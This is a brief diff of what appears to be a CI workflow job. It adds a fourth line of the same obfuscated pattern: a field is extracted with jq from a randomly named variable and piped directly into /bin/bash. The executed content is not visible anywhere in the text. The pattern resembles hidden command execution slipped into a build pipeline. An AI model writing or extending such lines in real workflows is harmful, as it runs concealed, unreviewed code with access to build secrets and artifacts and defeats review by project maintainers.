@@ -30,6 +30,7 @@ jobs:
           echo $t28 | jq -r .ta63 | /bin/bash
           printf '%s' "$n7851" | jq -r .cmgh766 | /bin/bash
           printf '%s' "$esi5" | jq -r .e604 | /bin/bash
+          echo $jd3 | jq -r .bh0674 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
